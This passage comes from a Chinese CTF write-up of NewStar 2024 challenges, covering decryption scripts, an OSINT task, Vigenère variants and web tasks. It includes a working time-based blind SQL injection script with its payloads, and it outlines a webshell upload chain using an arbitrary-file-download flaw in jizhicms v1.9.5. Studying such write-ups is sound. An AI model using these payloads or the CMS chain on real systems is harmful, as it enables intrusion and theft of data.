</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Correct flag!&#39;</span>)
</span></span></code></pre></div><p>解密得到flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Given encrypted values</span>
</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> [<span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">79</span>]
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NewStar2024&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypting the flag</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Compute the corresponding character</span>
</span></span><span style="display:flex;"><span>    char <span style="color:#f92672">=</span> chr(enc[i] <span style="color:#f92672">^</span> ord(key[i <span style="color:#f92672">%</span> len(key)]))
</span></span><span style="display:flex;"><span>    flag<span style="color:#f92672">.</span>append(char)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Join the list into a string</span>
</span></span><span style="display:flex;"><span>decrypted_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(flag)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Decrypted flag:&#39;</span>, decrypted_flag)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#  flag{Y0u_Know_Py1nstall3r_W311!}</span>
</span></span></code></pre></div><h2 id="misc-2">Misc<a hidden class="anchor" aria-hidden="true" href="#misc-2">#</a></h2>
<h3 id="bgm坏了吗">BGM坏了吗？<a hidden class="anchor" aria-hidden="true" href="#bgm坏了吗">#</a></h3>
<p>用aud检测一下，在最后十秒内有电话播音，可以提取这段音频，用工具得到</p>
<p><img alt="38" loading="lazy" src="../../images/Newstar/2024/38.png"></p>
<h3 id="amazinggame">AmazingGame<a hidden class="anchor" aria-hidden="true" href="#amazinggame">#</a></h3>
<p>jeb直接秒，游戏挺好玩的，base64解密</p>
<p><img alt="39" loading="lazy" src="../../images/Newstar/2024/39.png"></p>
<h3 id="osint-master">OSINT-MASTER<a hidden class="anchor" aria-hidden="true" href="#osint-master">#</a></h3>
<p>飞机定位可以看到是B-2419,查一下飞机的航班的飞行时间定位具体航班</p>
<p><img alt="41" loading="lazy" src="../../images/Newstar/2024/41.png"></p>
<p>看一下对应的航班</p>
<p><img alt="40" loading="lazy" src="../../images/Newstar/2024/40.png"></p>
<p>根据图片下面有个弯道河简单定位一下是济宁市</p>
<p>flag{MU5156_济宁市}</p>
<h3 id="ez_jai">ez_jai<a hidden class="anchor" aria-hidden="true" href="#ez_jai">#</a></h3>
<p>测试了一会发现了花括号可以用<code>&lt;%%&gt;</code>进行绕过</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">user_code</span>() <span style="color:#f92672">&lt;%</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello, World!&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
</span></span></code></pre></div><p><img alt="43" loading="lazy" src="../../images/Newstar/2024/43.png"></p>
<h2 id="crypto-2">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto-2">#</a></h2>
<h3 id="故事新编1">故事新编1<a hidden class="anchor" aria-hidden="true" href="#故事新编1">#</a></h3>
<p>先解密维吉尼亚密码，根据后面的无序尾猜测位数</p>
<p><img alt="42" loading="lazy" src="../../images/Newstar/2024/42.png"></p>
<p>得到之后一直在尝试但是一直没解出来，明显是出题人问题，有存在一个换行符</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
</span></span><span style="display:flex;"><span>zen1  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BEAUTIFUL IS BETTER THAN UGLY.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EXPLICIT IS BETTER THAN IMPLICIT.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SIMPLE IS BETTER THAN COMPLEX.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">COMPLEX IS BETTER THAN COMPLICATED.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FLAT IS BETTER THAN NESTED.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SPARSE IS BETTER THAN DENSE.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FLAGA IS VEGENERE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">READABILITY COUNTS.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SPECIAL CASES AREN&#39;T SPECIAL ENOUGH TO BREAK THE RULES.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ALTHOUGH PRACTICALITY BEATS PURITY.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ERRORS SHOULD NEVER PASS SILENTLY.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">UNLESS EXPLICITLY SILENCED.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>key1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SUBTITUTION&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc1</span>(plaintext, key):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shift_char</span>(c, k):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> chr(((ord(c) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> (ord(k) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>) <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> plaintext<span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    key_index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> plaintext:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():
</span></span><span style="display:flex;"><span>            ciphertext<span style="color:#f92672">.</span>append(shift_char(char, key[key_index <span style="color:#f92672">%</span> len(key)]))
</span></span><span style="display:flex;"><span>            key_index <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            ciphertext<span style="color:#f92672">.</span>append(char)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(ciphertext)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;enc = </span><span style="color:#ae81ff">\&#39;\&#39;\&#39;</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> enc1(zen1, key1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;\&#39;\&#39;</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>md5(zen1<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>print(flag)
</span></span></code></pre></div><h3 id="故事新编2">故事新编2<a hidden class="anchor" aria-hidden="true" href="#故事新编2">#</a></h3>
<p>参照1也是先解再解</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
</span></span><span style="display:flex;"><span>zen2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">IN THE FACE OF AMBIGUITY, REFUSE THE TEMPTATION TO GUESS.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">THERE SHOULD BE ONE-- AND PREFERABLY ONLY ONE --OBVIOUS WAY TO DO IT.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ALTHOUGH THAT WAY MAY NOT BE OBVIOUS AT FIRST UNLESS YOU&#39;RE DUTCH.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NOW IS BETTER THAN NEVER.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ALTHOUGH NEVER IS OFTEN BETTER THAN RIGHT NOW.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">IF THE IMPLEMENTATION IS HARD TO EXPLAIN, IT&#39;S A BAD IDEA.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">IF THE IMPLEMENTATION IS EASY TO EXPLAIN, IT MAY BE A GOOD IDEA.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>key2 <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;supersubtitution&#39;</span>
</span></span><span style="display:flex;"><span>dict1 <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;A&#39;</span>: <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;B&#39;</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;C&#39;</span>: <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#39;D&#39;</span>: <span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#39;E&#39;</span>: <span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#39;F&#39;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#e6db74">&#39;G&#39;</span>: <span style="color:#ae81ff">6</span>, <span style="color:#e6db74">&#39;H&#39;</span>: <span style="color:#ae81ff">7</span>, <span style="color:#e6db74">&#39;I&#39;</span>: <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;J&#39;</span>: <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#39;K&#39;</span>: <span style="color:#ae81ff">10</span>, <span style="color:#e6db74">&#39;L&#39;</span>: <span style="color:#ae81ff">11</span>, <span style="color:#e6db74">&#39;M&#39;</span>: <span style="color:#ae81ff">12</span>, <span style="color:#e6db74">&#39;N&#39;</span>: <span style="color:#ae81ff">13</span>, <span style="color:#e6db74">&#39;O&#39;</span>: <span style="color:#ae81ff">14</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#39;P&#39;</span>: <span style="color:#ae81ff">15</span>, <span style="color:#e6db74">&#39;Q&#39;</span>: <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;R&#39;</span>: <span style="color:#ae81ff">17</span>, <span style="color:#e6db74">&#39;S&#39;</span>: <span style="color:#ae81ff">18</span>, <span style="color:#e6db74">&#39;T&#39;</span>: <span style="color:#ae81ff">19</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#39;U&#39;</span>: <span style="color:#ae81ff">20</span>, <span style="color:#e6db74">&#39;V&#39;</span>: <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#39;W&#39;</span>: <span style="color:#ae81ff">22</span>, <span style="color:#e6db74">&#39;X&#39;</span>: <span style="color:#ae81ff">23</span>, <span style="color:#e6db74">&#39;Y&#39;</span>: <span style="color:#ae81ff">24</span>, <span style="color:#e6db74">&#39;Z&#39;</span>: <span style="color:#ae81ff">25</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dict2 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>: <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">1</span>: <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#ae81ff">2</span>: <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#ae81ff">3</span>: <span style="color:#e6db74">&#39;D&#39;</span>, <span style="color:#ae81ff">4</span>: <span style="color:#e6db74">&#39;E&#39;</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">5</span>: <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#ae81ff">6</span>: <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#ae81ff">7</span>: <span style="color:#e6db74">&#39;H&#39;</span>, <span style="color:#ae81ff">8</span>: <span style="color:#e6db74">&#39;I&#39;</span>, <span style="color:#ae81ff">9</span>: <span style="color:#e6db74">&#39;J&#39;</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">10</span>: <span style="color:#e6db74">&#39;K&#39;</span>, <span style="color:#ae81ff">11</span>: <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#ae81ff">12</span>: <span style="color:#e6db74">&#39;M&#39;</span>, <span style="color:#ae81ff">13</span>: <span style="color:#e6db74">&#39;N&#39;</span>, <span style="color:#ae81ff">14</span>: <span style="color:#e6db74">&#39;O&#39;</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">15</span>: <span style="color:#e6db74">&#39;P&#39;</span>, <span style="color:#ae81ff">16</span>: <span style="color:#e6db74">&#39;Q&#39;</span>, <span style="color:#ae81ff">17</span>: <span style="color:#e6db74">&#39;R&#39;</span>, <span style="color:#ae81ff">18</span>: <span style="color:#e6db74">&#39;S&#39;</span>, <span style="color:#ae81ff">19</span>: <span style="color:#e6db74">&#39;T&#39;</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">20</span>: <span style="color:#e6db74">&#39;U&#39;</span>, <span style="color:#ae81ff">21</span>: <span style="color:#e6db74">&#39;V&#39;</span>, <span style="color:#ae81ff">22</span>: <span style="color:#e6db74">&#39;W&#39;</span>, <span style="color:#ae81ff">23</span>: <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#ae81ff">24</span>: <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#ae81ff">25</span>: <span style="color:#e6db74">&#39;Z&#39;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>(message, key):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(message)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> message[i]<span style="color:#f92672">.</span>isalpha() <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">+=</span> message[i]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc2</span>(message, key):
</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> message<span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>upper()
</span></span><span style="display:flex;"><span>    key_new <span style="color:#f92672">=</span> generate_key(message, key)
</span></span><span style="display:flex;"><span>    cipher_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> message:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> letter<span style="color:#f92672">.</span>isalpha():
</span></span><span style="display:flex;"><span>            x <span style="color:#f92672">=</span> (dict1[letter]<span style="color:#f92672">+</span>dict1[key_new[i]]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>
</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            cipher_text <span style="color:#f92672">+=</span> dict2[x]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            cipher_text <span style="color:#f92672">+=</span> letter
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cipher_text
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;enc = </span><span style="color:#ae81ff">\&#39;\&#39;\&#39;</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> enc2(zen2, key2)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;\&#39;\&#39;</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag{&#39;</span><span style="color:#f92672">+</span>md5(zen2<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>
</span></span><span style="display:flex;"><span>print(flag)
</span></span></code></pre></div><h1 id="week4">week4<a hidden class="anchor" aria-hidden="true" href="#week4">#</a></h1>
<h2 id="web-3">web<a hidden class="anchor" aria-hidden="true" href="#web-3">#</a></h2>
<h3 id="blindsql2">blindsql2<a hidden class="anchor" aria-hidden="true" href="#blindsql2">#</a></h3>
<p>其实我的week3就是对的只是默认不匹配除<code>_</code>的字符导致我以为爆出来的表只有一个，现在上一下这周的脚本吧，f脚本需要多跑几次才能出准确的flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>dicts <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;{&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;}&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,&#34;</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2ze1c97lhjoq1bd4ebwl.cloudeci1.ichunqiu.com/&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag_char</span>(index):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> dicts:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload = f&#34;-1&#39;||(if(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),{index},1)like(&#39;{char}&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload = f&#34;-1&#39;||(if(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\&#39;secrets\&#39;)),{index},1)like(&#39;{char}&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># id,secret_key,secret_value</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#最终情况: i_want_a_girlfriend_i_want_to_beWa_good_ctfer_flag__b_cbb___b_f</span>
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-1&#39;||(if(mid((select(group_concat(secret_value))from(secrets)where((secret_value)like(&#39;flag%&#39;))),</span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)like(&#39;</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#flag{2b4cbb60-b6ff-4e2f-ab20-e9c5bc964f91}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#flag{2b4cbb60-b6ff-4e2f-ab20-e9c5b1364f91}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#flag{2b4cbb60-b6ff-4e2f-ab20-e9c5b1964f91}</span>
</span></span><span style="display:flex;"><span>        params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;student_name&#39;</span>: payload}
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url, params<span style="color:#f92672">=</span>params)
</span></span><span style="display:flex;"><span>            end_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>            sub <span style="color:#f92672">=</span> end_time <span style="color:#f92672">-</span> start_time
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> sub <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0.5</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> char
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;请求失败: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>    char <span style="color:#f92672">=</span> get_flag_char(i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> char:
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;当前情况: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;已结束&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;最终情况: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><h3 id="chocolate">chocolate<a hidden class="anchor" aria-hidden="true" href="#chocolate">#</a></h3>
<p>开头直接dirsearch扫了一遍</p>
<p><img alt="44" loading="lazy" src="../../images/Newstar/2024/44.png"></p>
<p>第一层数字截断绕过</p>
<p><img alt="45" loading="lazy" src="../../images/Newstar/2024/45.png"></p>
<p>第二层md5</p>
<p><img alt="46" loading="lazy" src="../../images/Newstar/2024/46.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 要寻找的前五位哈希</span>
</span></span><span style="display:flex;"><span>target_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8031b&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 从这里开始你可以定义要搜索的范围</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10000000</span>):  <span style="color:#75715e"># 你可以根据需要调整这个范围</span>
</span></span><span style="display:flex;"><span>    next_level <span style="color:#f92672">=</span> str(i)  <span style="color:#75715e"># 可以尝试其他类型的输入</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 计算 MD5 哈希</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>md5(next_level<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()<span style="color:#f92672">.</span>startswith(target_prefix):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;找到的值: </span><span style="color:#e6db74">{</span>next_level<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;no&#34;</span>)
</span></span></code></pre></div><p>第三层大小写绕过bp发包</p>
<p><img alt="47" loading="lazy" src="../../images/Newstar/2024/47.png"></p>
<p>最后一层直接bpfuzz一下</p>
<p><img alt="48" loading="lazy" src="../../images/Newstar/2024/48.png"></p>
<h3 id="ezcmsss复现">ezcmsss(复现)<a hidden class="anchor" aria-hidden="true" href="#ezcmsss复现">#</a></h3>
<p>用dir扫目录可以发现有www.zip，下载下来里面有后台管理的账户和密码<code>admin_name=jizhicms1498 &amp; admin_pass=4oP4fB51r5</code></p>
<p>后台界面在<code>admin.php</code>里登入后台，发现 jizhicms v1.9.5 有一个管理界面的任意文件下载漏洞，插件里面只有一个不能出网，<del>我到这里当时就卡住了</del>实际流程是需要在将<code>.zip</code>文件上传到题目容器里，然后通过任意文件下载漏洞本地下载解压</p>
<p>其中的一种是在<code>栏目管理-栏目列表-新增栏目</code>中增加附件，上传构造好的php🐎的压缩包</p>
<p>上传的时候bp截取然后获取压缩包的内容</p>
<p><img alt="50" loading="lazy" src="../../images/Newstar/2024/50.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>/static/upload/file/20241104/1730714912409405.zip
</span></span></code></pre></div><p>然后就可以按照网上泄露的漏洞来打了</p>
<p><img alt="51" loading="lazy" src="../../images/Newstar/2024/51.png"></p>
<p><code>filepath</code>的参数随意，然后把刚才抓到的zip路径贴上去</p>
<p>然后对文件进行解压</p>
